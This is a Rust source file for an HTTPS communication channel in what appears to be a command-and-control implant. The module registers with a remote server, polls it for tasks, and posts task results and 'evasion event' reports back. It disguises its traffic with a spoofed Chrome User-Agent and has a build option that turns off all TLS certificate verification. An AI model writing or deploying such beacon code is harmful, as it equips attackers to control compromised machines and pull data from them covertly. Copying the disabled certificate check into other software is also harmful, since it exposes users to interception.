use std::sync::Arc;

use serde_json;
use ureq::{Agent, AgentBuilder};

use super::{Channel, ChannelError};
use crate::task::{PollResponse, RegisterRequest, RegisterResponse, TaskOutputRequest};

const DEFAULT_UA: &str =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
     (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

fn user_agent() -> &'static str {
    match option_env!("DM_UA") {
        Some(ua) if !ua.is_empty() => ua,
        _ => DEFAULT_UA,
    }
}

const fn str_eq(a: &str, b: &str) -> bool {
    let (a, b) = (a.as_bytes(), b.as_bytes());
    if a.len() != b.len() { return false; }
    let mut i = 0;
    while i < a.len() {
        if a[i] != b[i] { return false; }
        i += 1;
    }
    true
}

pub const TLS_SKIP_VERIFY: bool = str_eq(env!("DM_TLS_SKIP_VERIFY"), "true");

pub struct HttpsChannel {
    host:  String,
    port:  String,
    agent: Agent,
}

impl HttpsChannel {
    pub fn new(host: &str, port: &str) -> Self {
        let mut builder = AgentBuilder::new()
            .user_agent(user_agent())
            .timeout_connect(std::time::Duration::from_secs(10))
            .timeout(std::time::Duration::from_secs(30));

        if TLS_SKIP_VERIFY {
            builder = builder.tls_config(Arc::new(danger_tls_config()));
        }

        Self {
            host:  host.to_string(),
            port:  port.to_string(),
            agent: builder.build(),
        }
    }

    fn url(&self, path: &str) -> String {
        format!("https://{}:{}{}", self.host, self.port, path)
    }
}

impl Channel for HttpsChannel {
    fn register(
        &mut self,
        req: &RegisterRequest,
        path: &str,
    ) -> Result<RegisterResponse, ChannelError> {
        let body = serde_json::to_vec(req)
            .map_err(|e| ChannelError::Parse(e.to_string()))?;

        let resp = self.agent
            .post(&self.url(path))
            .set("Content-Type", "application/octet-stream")
            .send_bytes(&body)
            .map_err(|e| ChannelError::Network(e.to_string()))?;

        let reg: RegisterResponse = resp.into_json()
            .map_err(|e| ChannelError::Parse(e.to_string()))?;

        Ok(reg)
    }

    fn poll(
        &mut self,
        session: &crate::Session,
        path: &str,
    ) -> Result<PollResponse, ChannelError> {
        let resp = self.agent
            .get(&self.url(path))
            .set("X-Request-ID", &session.id)
            .call()
            .map_err(|e| ChannelError::Network(e.to_string()))?;

        let poll: PollResponse = resp.into_json()
            .map_err(|e| ChannelError::Parse(e.to_string()))?;

        Ok(poll)
    }

    fn submit_output(
        &mut self,
        session:             &crate::Session,
        path:                &str,
        task_id:             &str,
        output:              Vec<u8>,
        success:             bool,
        evasion_event:       bool,
        evasion_description: String,
    ) -> Result<(), ChannelError> {
        let req = TaskOutputRequest {
            session_id:          session.id.clone(),
            task_id:             task_id.to_string(),
            output,
            success,
            evasion_event,
            evasion_description,
        };

        let body = serde_json::to_vec(&req)
            .map_err(|e| ChannelError::Parse(e.to_string()))?;

        self.agent
            .post(&self.url(path))
            .set("Content-Type", "application/octet-stream")
            .set("X-Request-ID", &session.id)
            .send_bytes(&body)
            .map_err(|e| ChannelError::Network(e.to_string()))?;

        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Dev-only: accept self-signed / any TLS certificate
// ---------------------------------------------------------------------------

pub fn danger_tls_config() -> rustls::ClientConfig {
    use rustls::client::danger::{
        HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier,
    };
    use rustls::pki_types::{CertificateDer, ServerName, UnixTime};
    use rustls::{DigitallySignedStruct, Error, SignatureScheme};

    #[derive(Debug)]
    struct NoVerifier;

    impl ServerCertVerifier for NoVerifier {
        fn verify_server_cert(
            &self,
            _end_entity:    &CertificateDer<'_>,
            _intermediates: &[CertificateDer<'_>],
            _server_name:   &ServerName<'_>,
            _ocsp:          &[u8],
            _now:           UnixTime,
        ) -> Result<ServerCertVerified, Error> {
            Ok(ServerCertVerified::assertion())
        }

        fn verify_tls12_signature(
            &self,
            _message: &[u8],
            _cert:    &CertificateDer<'_>,
            _dss:     &DigitallySignedStruct,
        ) -> Result<HandshakeSignatureValid, Error> {
            Ok(HandshakeSignatureValid::assertion())
        }

        fn verify_tls13_signature(
            &self,
            _message: &[u8],
            _cert:    &CertificateDer<'_>,
            _dss:     &DigitallySignedStruct,
        ) -> Result<HandshakeSignatureValid, Error> {
            Ok(HandshakeSignatureValid::assertion())
        }

        fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
            rustls::crypto::ring::default_provider()
                .signature_verification_algorithms
                .supported_schemes()
        }
    }

    // Use ring explicitly to avoid aws-lc-rs cross-compilation issues
    let provider = Arc::new(rustls::crypto::ring::default_provider());
    rustls::ClientConfig::builder_with_provider(provider)
        .with_safe_default_protocol_versions()
        .unwrap()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(NoVerifier))
        .with_no_client_auth()
}
